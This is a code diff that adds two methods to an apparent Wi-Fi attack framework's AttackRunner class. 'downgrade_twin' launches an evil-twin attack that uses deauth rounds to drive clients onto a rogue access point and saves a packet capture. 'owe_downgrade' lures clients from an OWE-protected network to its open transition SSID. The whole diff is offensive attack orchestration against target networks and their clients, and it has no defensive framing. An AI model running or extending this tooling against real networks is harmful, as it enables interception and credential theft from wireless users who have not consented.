@@ -267,6 +267,47 @@ class AttackRunner:
             return f"Evil Twin: password captured → {result.password!r}"
         return f"Evil Twin: {result.detail}"
 
+    def downgrade_twin(self, ap, iface_ap: str) -> str:
+        from ..attacks.eviltwin import run_downgrade_twin
+        from ..frames import BROADCAST
+        from ..storage import target_capture_dir
+
+        if ap.pmf == "required":
+            self._progress_fn(
+                "downgrade_twin: PMF required on the real AP — deauth rounds will be dropped, "
+                "clients will only drift to the rogue twin if they reconnect on their own"
+            )
+        out_dir = target_capture_dir(ap.ssid, ap.bssid)
+        out_file = out_dir / f"downgrade_twin_{int(time.time())}.pcap"
+        result = run_downgrade_twin(
+            iface_ap=iface_ap,
+            iface_mon=self._iface,
+            bssid=ap.bssid,
+            ssid=ap.ssid,
+            channel=ap.channel or 6,
+            outfile=str(out_file),
+            client=next(iter(ap.clients), BROADCAST),
+            stop_event=self._stop_event,
+            progress_fn=self._progress_fn,
+        )
+        return f"Downgrade Twin: {result.detail}"
+
+    def owe_downgrade(self, ap, iface_ap: str) -> str:
+        from ..attacks.eviltwin import run_owe_downgrade
+        from ..frames import BROADCAST
+
+        result = run_owe_downgrade(
+            iface_ap=iface_ap,
+            iface_mon=self._iface,
+            owe_bssid=ap.bssid,
+            open_ssid=ap.owe_transition_ssid,
+            channel=ap.channel or 6,
+            client=next(iter(ap.clients), BROADCAST),
+            stop_event=self._stop_event,
+            progress_fn=self._progress_fn,
+        )
+        return f"OWE Downgrade: {result.detail}"
+
     def online_guess(self, ap) -> str:
         from ..attacks.online import online_guess
 
